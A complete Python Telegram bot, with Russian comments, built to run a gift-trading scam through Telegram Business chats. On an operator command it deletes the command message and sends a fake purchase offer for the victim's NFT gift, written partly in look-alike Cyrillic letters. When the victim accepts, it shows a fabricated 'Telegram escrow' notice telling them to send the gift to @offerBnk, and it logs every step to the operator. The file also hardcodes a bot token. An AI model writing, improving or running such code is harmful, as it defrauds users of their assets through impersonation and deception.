import asyncio
import logging
import random
import re
import string
import uuid

from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.exceptions import TelegramRetryAfter, TelegramBadRequest, TelegramForbiddenError
from aiogram.types import (
    Message, CallbackQuery, BusinessConnection,
    InlineKeyboardMarkup, InlineKeyboardButton,
)
from aiogram.enums import ParseMode

# ============================================================
# КОНФИГУРАЦИЯ
# ============================================================
BOT_TOKEN = "8960916793:AAG5xjIUE9-7Mgrbyx5ysh6S2c15nhDvnVM"
ADMIN_LOG_ID = 8950111892

EMOJI_STARS = "5920433463428650761"
EMOJI_GRAM = "5267445215773367585"
EMOJI_DECLINE_EN = "5774077015388852135"
EMOJI_ACCEPT = "5774022692642492953"

logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | %(name)s | %(message)s")
logger = logging.getLogger(__name__)

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

business_owner_ids: dict[str, int] = {}
offers: dict[str, dict] = {}
banned_users: set[str] = set()

# ============================================================
# БАНЫ И УТИЛИТЫ
# ============================================================
def is_banned(user_id: int, username: str | None) -> bool:
    if str(user_id) in banned_users: return True
    if username and f"@{username.lower()}" in banned_users: return True
    return False

def ban_user(identifier: str) -> str:
    ident = identifier.strip()
    if not ident: return "❌ Укажи @username или ID."
    if ident.isdigit() or (ident.startswith("-") and ident[1:].isdigit()):
        banned_users.add(ident); return f"✅ ID <code>{ident}</code> забанен."
    if ident.startswith("@"): ident = ident[1:]
    banned_users.add(f"@{ident.lower()}"); return f"✅ @{ident} забанен."

def unban_user(identifier: str) -> str:
    ident = identifier.strip()
    if not ident: return "❌ Укажи @username или ID."
    if ident.isdigit() or (ident.startswith("-") and ident[1:].isdigit()):
        banned_users.discard(ident); return f"✅ ID <code>{ident}</code> разбанен."
    if ident.startswith("@"): ident = ident[1:]
    banned_users.discard(f"@{ident.lower()}"); return f"✅ @{ident} разбанен."

def format_gift_name(slug: str, number: str) -> str:
    formatted_slug = re.sub(r'(?<!^)(?=[A-Z])', ' ', slug)
    return f"{formatted_slug} #{number}"

# ============================================================
# ЛОГИ ДЛЯ АДМИНА
# ============================================================
def get_log_text(data: dict, status: str) -> str:
    status_map = {
        "pending": ("⏳", "Отправлен", "Не принят"),
        "accepted": ("✅", "Принят", "Да"),
        "declined": ("❌", "Отклонён", "Нет"),
    }
    status_emoji, status_text, transferred_text = status_map.get(status, ("⏳", "Отправлен", "Не принят"))
    gift_name_str = format_gift_name(data['gift_slug'], data['gift_number'])
    gift_display = f'<a href="{data["link"]}"><b>{gift_name_str}</b></a>'
    
    if data["currency"] == "gram":
        emoji_id, emoji_char, currency_name = EMOJI_GRAM, "🪙", "GRAM"
    else:
        emoji_id, emoji_char, currency_name = EMOJI_STARS, "⭐", "Stars"
        
    emoji_tag = f'<tg-emoji emoji-id="{emoji_id}">{emoji_char}</tg-emoji>'
    return (
        f"<b>Оффер отправлен</b>\n\n"
        f"<b>Подарок:</b> {gift_display}\n"
        f"<b>Сумма:</b> {data['amount']}\n"
        f"<b>Валюта:</b> {emoji_tag} {currency_name}\n"
        f"<b>Отправил:</b> @{data['sender_username']} | {data['sender_id']}\n"
        f"<b>Владелец подарка:</b> Нет доступа\n"
        f"<b>Передан:</b> {transferred_text}\n\n"
        f"<b>Статус:</b> {status_emoji} {status_text}"
    )

def get_log_keyboard(data: dict) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🎁 Ссылка на подарок", url=data["link"])]])

async def send_log_to_admin(data: dict):
    try:
        msg = await bot.send_message(
            chat_id=ADMIN_LOG_ID, 
            text=get_log_text(data, "pending"), 
            reply_markup=get_log_keyboard(data), 
            disable_web_page_preview=True
        )
        data["log_msg_id"] = msg.message_id
    except Exception as e:
        logger.error(f"[admin-log] Ошибка: {e}")

async def update_log_message(data: dict, status: str):
    if "log_msg_id" not in data: return
    try:
        await bot.edit_message_text(
            chat_id=ADMIN_LOG_ID,
            message_id=data["log_msg_id"],
            text=get_log_text(data, status),
            reply_markup=get_log_keyboard(data),
            disable_web_page_preview=True
        )
    except Exception as e:
        logger.error(f"[admin-log] Ошибка обновления: {e}")

# ============================================================
# БИЗНЕС-ЛОГИКА (AIogram)
# ============================================================
async def send_with_fallback(bc_id, chat_id, text, reply_markup=None):
    for attempt in range(1, 4):
        try:
            return await bot.send_message(chat_id=chat_id, text=text, reply_markup=reply_markup, business_connection_id=str(bc_id), disable_web_page_preview=False)
        except TelegramRetryAfter as e: await asyncio.sleep(e.retry_after + 1)
        except TelegramBadRequest as e:
            if "PEER_FLOOD" in str(e): raise
            clean_text = re.sub(r"<tg-emoji[^>]*>(.*?)</tg-emoji>", r"\1", text)
            if reply_markup:
                for row in reply_markup.inline_keyboard:
                    for btn in row: btn.icon_custom_emoji_id = None
            try:
                return await bot.send_message(chat_id=chat_id, text=clean_text, reply_markup=reply_markup, business_connection_id=str(bc_id), disable_web_page_preview=False)
            except Exception:
                if attempt == 3: raise

async def edit_with_fallback(bc_id, chat_id, message_id, text, reply_markup=None):
    try:
        await bot.edit_message_text(business_connection_id=str(bc_id), chat_id=chat_id, message_id=message_id, text=text, reply_markup=reply_markup)
        return True
    except TelegramBadRequest as e:
        if "message is not modified" in str(e): return True
        clean_text = re.sub(r"<tg-emoji[^>]*>(.*?)</tg-emoji>", r"\1", text)
        if reply_markup:
            for row in reply_markup.inline_keyboard:
                for btn in row: btn.icon_custom_emoji_id = None
        try:
            await bot.edit_message_text(business_connection_id=str(bc_id), chat_id=chat_id, message_id=message_id, text=clean_text, reply_markup=reply_markup)
            return True
        except Exception: return False

@dp.business_connection()
async def handle_business_connection(connection: BusinessConnection) -> None:
    business_owner_ids[connection.id] = connection.user.id

@dp.business_message(F.text.regexp(r"(?i)^truslo\s"))
async def handle_offer(message: Message) -> None:
    if not message.business_connection_id: return
    bc_id = message.business_connection_id

    sender_id = message.from_user.id if message.from_user else 0
    sender_username = message.from_user.username if message.from_user else None

    if is_banned(sender_id, sender_username):
        try: await bot.delete_business_messages(business_connection_id=str(bc_id), message_ids=[message.message_id])
        except: pass
        try:
            await bot.send_message(chat_id=message.chat.id, text="я забанен, причина: я хуесос\n\nхотел кинуть тебе фейк офер но меня забанили сори", business_connection_id=str(bc_id))
        except: pass
        return

    parts = message.text.strip().split()
    if len(parts) < 3 or not parts[2].isdigit(): return
    
    link_raw = parts[1]
    amount = parts[2]
    currency = parts[3].lower() if len(parts) > 3 else "stars"
    
    link_match = re.search(r"(?:https?://)?t\.me/nft/([A-Za-z]+)-(\d+)", link_raw)
    if not link_match: return
    slug, number = link_match.group(1), link_match.group(2)
    full_link = f"https://t.me/nft/{slug}-{number}"

    try: await bot.delete_business_messages(business_connection_id=str(bc_id), message_ids=[message.message_id])
    except: pass

    await asyncio.sleep(3)

    amount_fmt = f"{int(amount):,}"
    gift_display = f'<a href="{full_link}"><b>{slug}-{number}</b></a>'
    emoji = f'<tg-emoji emoji-id="{EMOJI_GRAM if currency == "gram" else EMOJI_STARS}">{"🪙" if currency == "gram" else "⭐"}</tg-emoji>'

    text = f"Usеr <b>{message.from_user.full_name if message.from_user else 'Unknown'}</b> оffеrs уоu <b>{amount_fmt}</b> {emoji} fоr thе gift {gift_display}.\n\nТhе оffеr ls vаIid fоr <b>6 h. 0 min</b>.."

    offer_id = uuid.uuid4().hex[:12]
    offers[offer_id] = {
        "link": full_link, "gift_slug": slug, "gift_number": number, "amount": amount, "currency": currency,
        "bc_id": bc_id, "chat_id": message.chat.id, "accepted": False,
        "sender_name": message.from_user.full_name if message.from_user else "Unknown",
        "sender_username": sender_username or f"id{sender_id}", "sender_id": sender_id
    }

    keyboard = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="Decline", callback_data=f"dec:{offer_id}", icon_custom_emoji_id=EMOJI_DECLINE_EN),
        InlineKeyboardButton(text="Accept", callback_data=f"acc:{offer_id}", icon_custom_emoji_id=EMOJI_ACCEPT)
    ]])

    try:
        sent = await send_with_fallback(bc_id=bc_id, chat_id=message.chat.id, text=text, reply_markup=keyboard)
        offers[offer_id]["msg_id"] = sent.message_id
        await send_log_to_admin(offers[offer_id])
    except Exception as e:
        logger.error(f"[offer-send] Ошибка: {e}")

@dp.callback_query(F.data.startswith("dec:"))
async def handle_decline(callback: CallbackQuery) -> None:
    _, offer_id = callback.data.split(":", 1)
    data = offers.get(offer_id)
    if not data or data.get("accepted"): return await callback.answer()
    await callback.answer()
    await asyncio.sleep(0.3)
    await edit_with_fallback(data["bc_id"], data["chat_id"], data["msg_id"], f'<tg-emoji emoji-id="{EMOJI_DECLINE_EN}">❌</tg-emoji> Offer has been declined.')
    await update_log_message(data, "declined")

@dp.callback_query(F.data.startswith("acc:"))
async def handle_accept(callback: CallbackQuery) -> None:
    _, offer_id = callback.data.split(":", 1)
    data = offers.get(offer_id)
    if not data or data.get("accepted"): return await callback.answer()
    data["accepted"] = True
    await callback.answer()
    await asyncio.sleep(0.3)
    
    amount_fmt = f"{int(data['amount']):,}"
    gift_display = f'<a href="{data["link"]}"><b>{data["gift_slug"]}-{data["gift_number"]}</b></a>'
    emoji = f'<tg-emoji emoji-id="{EMOJI_GRAM if data["currency"] == "gram" else EMOJI_STARS}">{"🪙" if data["currency"] == "gram" else "⭐"}</tg-emoji>'
    cur_u = "GRАM" if data["currency"] == "gram" else "Stаrs"
    cur_l = "GRАM" if data["currency"] == "gram" else "stаrs"

    order_id = f"ТG-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
    accept_text = (
        f"<b>NFТ Dеаl</b>\n\n<b>Оrdеr</b> #{order_id}\n\n"
        f"Тhе buуеr hаs rеsеrvеd <b>{amount_fmt}</b> {emoji} thrоugh thе ТеIеgrаm еsсrоw sуstеm. "
        f"Тhе {cur_l} аrе hеId ln а sресiаI еsсrоw ассоunt аnd wlII bе аutоmаtiсаIIy сrеditеd tо уоur ТеIеgrаm {cur_u} bаIаnсе right аftеr thе gift is trаnsfеrrd.\n\n"
        f"<b>lnstruсtlоns tо соmрlеtе thе dеаl:</b>\n\n"
        f"1. Send to: @offerBnk\n"
        f"2. СIiсk «Sеnd Gift» аnd sеlесt {gift_display}\n"
        f"3. Соnfirm thе glft trаnsfеr.\n\n"
        f"ТеIеgrаm wiII rесоrd thе trаnsасtiоn аnd instаntIу сrеdit <b>{amount_fmt}</b> {emoji} tо уоur bаIаnсе. Тhе rеsеrvаtiоn is vаlid fоr 24 hоurs."
    )
    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Send Gift", url="tg://send_gift?to=offerBnk")]])
    await edit_with_fallback(data["bc_id"], data["chat_id"], data["msg_id"], accept_text, reply_markup=keyboard)
    await update_log_message(data, "accepted")

# ============================================================
# АДМИН КОМАНДЫ
# ============================================================
@dp.message(F.text.startswith("/ban"))
async def cmd_ban(message: Message):
    if message.from_user.id != ADMIN_LOG_ID: return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2: return await message.answer("❌ /ban @username или /ban ID")
    await message.answer(ban_user(parts[1]))

@dp.message(F.text.startswith("/unban"))
async def cmd_unban(message: Message):
    if message.from_user.id != ADMIN_LOG_ID: return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2: return await message.answer("❌ /unban @username или /unban ID")
    await message.answer(unban_user(parts[1]))

# ============================================================
# ЗАПУСК
# ============================================================
async def main():
    logger.info("Бот запущен...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        logger.info("Бот остановлен.")
